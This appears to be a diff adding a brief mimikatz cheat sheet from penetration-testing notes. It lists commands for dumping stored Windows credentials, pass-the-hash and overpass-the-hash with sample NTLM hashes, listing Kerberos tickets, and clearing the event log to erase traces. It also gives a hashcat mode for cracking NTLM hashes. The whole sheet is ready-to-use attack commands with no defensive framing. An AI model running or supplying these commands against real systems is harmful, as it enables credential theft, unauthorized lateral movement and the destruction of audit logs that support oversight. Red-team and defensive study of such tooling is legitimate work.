@@ -1,0 +1,30 @@
+[-]======================================[-]
+    mimikatz
+[-]======================================[-]
+
+- ---] Quick Commands
+======================
+
+# Dump stored password hashes
+sekurlsa::logonpasswords
+
+# Pass The Hash
+sekurlsa::pth /user:administrator /domain:. /ntlm:7ddade167a491d4f28eb25728469310e
+
+# Overpass The Hash
+sekurlsa::pth /user:administrator /domain:xor.com /ntlm:7c13687d23a3a88e57fc9ef8bb4cdf2f /run:powershell.exe
+
+# List Kerberos Tickets
+kerberos::list
+
+# Clear Event Log
+EVENT::Clear
+
+
+
+- ---] Related Commands
+======================
+
+# Hashcat for NTLM
+Hashcat -m 1000
+
